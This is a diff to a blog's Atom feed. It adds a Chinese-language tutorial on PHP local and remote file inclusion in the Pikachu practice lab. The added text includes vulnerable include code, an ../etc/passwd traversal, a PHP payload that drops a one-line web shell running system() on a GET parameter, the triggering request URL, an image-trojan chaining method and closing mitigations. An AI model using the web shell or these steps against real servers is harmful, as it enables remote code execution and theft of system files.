@@ -6,7 +6,7 @@
   <link href="http://m4o9.github.io/atom.xml" rel="self"/>
   
   <link href="http://m4o9.github.io/"/>
-  <updated>2021-07-31T14:30:50.901Z</updated>
+  <updated>2021-07-31T15:47:43.237Z</updated>
   <id>http://m4o9.github.io/</id>
   
   <author>
@@ -21,9 +21,9 @@
     <link href="http://m4o9.github.io/2021/07/31/pikachu6/"/>
     <id>http://m4o9.github.io/2021/07/31/pikachu6/</id>
     <published>2021-07-31T09:48:11.000Z</published>
-    <updated>2021-07-31T14:30:50.901Z</updated>
+    <updated>2021-07-31T15:47:43.237Z</updated>
     
-    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="文件包含漏洞概述"><a href="#文件包含漏洞概述" class="headerlink" title="文件包含漏洞概述"></a>文件包含漏洞概述</h1><p>在 Web 后台开发中，程序员往往为了提高效率以及让代码看起来更加简洁，会使用 “包含” 函数功能。比如把一系列功能函数都写进 function.php 中，之后当某个文件需要调用的时候直接在文件头中写上一句 <?php include function.php?>就可以调用函数。</p><p>但有些时候，因为网站功能需求，会让前端用户选择需要包含的文件（或者在前端的功能中使用了“包含”功能），又由于开发人员没有对要包含的这个文件进行安全考虑，就导致攻击者可以通过修改文件的位置来让后台执行任意文件（代码）。</p><p>分为 本地文件包含 和 远程文件包含 两种。</p><h2 id="包含函数"><a href="#包含函数" class="headerlink" title="包含函数"></a>包含函数</h2><p>通过 <code>include()</code> 或者 <code>require()</code> 语句，可以将 PHP 文件的内容插入另一个 PHP 文件（在服务器执行它之前）</p><p>include 和 require 是相同的，除了错误处理方面：</p><ul><li>require 会生成致命错误（ E_COMPILE_ERROR ）并停止脚本</li><li>include 只生成警告（ E_WARNING ），并且脚本会继续</li></ul><h2 id="本地文件包含漏洞"><a href="#本地文件包含漏洞" class="headerlink" title="本地文件包含漏洞"></a>本地文件包含漏洞</h2><p>在页面提交请求之后，发现请求地址是通过URL传入的，修改至../../../../../../../etc/passwd，如果有访问权限，即可直接读取</p><img src="https://gitee.com/TyRantXx/imgs/raw/master/imgs/p6-1.png"  width="70%">]]></content>
+    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="文件包含漏洞概述"><a href="#文件包含漏洞概述" class="headerlink" title="文件包含漏洞概述"></a>文件包含漏洞概述</h1><p>在 Web 后台开发中，程序员往往为了提高效率以及让代码看起来更加简洁，会使用 “包含” 函数功能。比如把一系列功能函数都写进 function.php 中，之后当某个文件需要调用的时候直接在文件头中写上一句 <?php include function.php?>就可以调用函数。</p><p>但有些时候，因为网站功能需求，会让前端用户选择需要包含的文件（或者在前端的功能中使用了“包含”功能），又由于开发人员没有对要包含的这个文件进行安全考虑，就导致攻击者可以通过修改文件的位置来让后台执行任意文件（代码）。</p><p>分为 本地文件包含 和 远程文件包含 两种。</p><h2 id="包含函数"><a href="#包含函数" class="headerlink" title="包含函数"></a>包含函数</h2><p>通过 <code>include()</code> 或者 <code>require()</code> 语句，可以将 PHP 文件的内容插入另一个 PHP 文件（在服务器执行它之前）</p><p>include 和 require 是相同的，除了错误处理方面：</p><ul><li>require 会生成致命错误（ E_COMPILE_ERROR ）并停止脚本</li><li>include 只生成警告（ E_WARNING ），并且脚本会继续</li></ul><h2 id="本地文件包含漏洞"><a href="#本地文件包含漏洞" class="headerlink" title="本地文件包含漏洞"></a>本地文件包含漏洞</h2><p>在页面提交请求之后，发现请求地址是通过URL传入的，修改至../../../../../../../etc/passwd，如果有访问权限，即可直接读取</p><img src="https://gitee.com/TyRantXx/imgs/raw/master/imgs/p6-1.png"  width="70%"><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$html</span>=<span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;submit&#x27;</span>]) &amp;&amp; <span class="variable">$_GET</span>[<span class="string">&#x27;filename&#x27;</span>]!=<span class="literal">null</span>)&#123;</span><br><span class="line">    <span class="variable">$filename</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;filename&#x27;</span>];</span><br><span class="line">    <span class="keyword">include</span> <span class="string">&quot;include/<span class="subst">$filename</span>&quot;</span>;<span class="comment">//变量传进来直接包含,没做任何的安全限制</span></span><br><span class="line"><span class="comment">//     安全的写法,使用白名单，严格指定包含的文件名</span></span><br><span class="line"><span class="comment">//     if($filename==&#x27;file1.php&#x27; || $filename==&#x27;file2.php&#x27; || $filename==&#x27;file3.php&#x27; || $filename==&#x27;file4.php&#x27; || $filename==&#x27;file5.php&#x27;)&#123;</span></span><br><span class="line"><span class="comment">//         include &quot;include/$filename&quot;;</span></span><br><span class="line"><span class="comment">//     &#125;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="远程文件包含漏洞"><a href="#远程文件包含漏洞" class="headerlink" title="远程文件包含漏洞"></a>远程文件包含漏洞</h2><p>远程文件包含漏洞形式和本地文件包含漏洞差不多，在远程文件包含漏洞中，攻击者可以通过访问外部地址来加载远程代码</p><p>远程包含漏洞前提：如果使用 include 和 require ，则需要 php.ini 配置如下</p><blockquote><p>allow_url_fopen = on<br>allow_url_include = on</p></blockquote><p>攻击者准备一个存放恶意代码的网页 </p><p>内容如下 是个一句话木马</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$myfile</span> = fopen(<span class="string">&quot;yijuhua.php&quot;</span>, <span class="string">&quot;w&quot;</span>);</span><br><span class="line">    <span class="variable">$txt</span> = <span class="string">&#x27;&lt;?php system($_GET[x]);?&gt;&#x27;</span>;</span><br><span class="line">    fwrite(<span class="variable">$myfile</span>, <span class="variable">$txt</span>);</span><br><span class="line">    fclose(<span class="variable">$myfile</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>然后在存在漏洞的网页发起请求，更改 <code>filename</code> 为网页地址</p><p><code>http://漏洞站点/vul/fileinclude/fi_remote.php?filename=你的恶意代码网页&amp;submit=%E6%8F%90%E4%BA%A4</code></p><p>即可发现目录下多了一个yijuhua.php的页面，之后再访问这个页面就可以利用x参数了</p><h1 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h1><p>一般只有文件包含漏洞或者文件上传漏洞是比较难利用的。但如果存在着两个漏洞则可以配合使用。</p><p>如果服务器仅仅只允许上传图片，我们可以尝试用图片木马的方式绕过检查机制</p><ul><li>制作一个图片木马，通过文件上传漏洞上传</li><li>通过文件包含漏洞对该图片木马进行“包含”</li><li>获取执行结果</li></ul><h1 id="防范措施"><a href="#防范措施" class="headerlink" title="防范措施"></a>防范措施</h1><p>在功能设计上尽量不要将文件包含函数对应的文件放给前端选择和操作</p><ul><li>过滤各种 ../../，http://，https://</li><li>配置 php.ini 配置文件<blockquote><p>allow_url_fopen = off<br>allow_url_include = off<br>magic_quotes_gpc = on</p></blockquote></li><li>通过白名单策略，仅允许包含运行指定的文件，其他的都禁止</li></ul>]]></content>
     
     
       
@@ -96,9 +96,9 @@
     
     <category term="Web渗透" scheme="http://m4o9.github.io/tags/Web%E6%B8%97%E9%80%8F/"/>
     
-    <category term="sql注入" scheme="http://m4o9.github.io/tags/sql%E6%B3%A8%E5%85%A5/"/>
-    
     <category term="笔记" scheme="http://m4o9.github.io/tags/%E7%AC%94%E8%AE%B0/"/>
+    
+    <category term="sql注入" scheme="http://m4o9.github.io/tags/sql%E6%B3%A8%E5%85%A5/"/>
     
   </entry>
   
@@ -124,9 +124,9 @@
     
     <category term="Web渗透" scheme="http://m4o9.github.io/tags/Web%E6%B8%97%E9%80%8F/"/>
     
-    <category term="笔记" scheme="http://m4o9.github.io/tags/%E7%AC%94%E8%AE%B0/"/>
-    
     <category term="csrf" scheme="http://m4o9.github.io/tags/csrf/"/>
+    
+    <category term="笔记" scheme="http://m4o9.github.io/tags/%E7%AC%94%E8%AE%B0/"/>
     
   </entry>
   
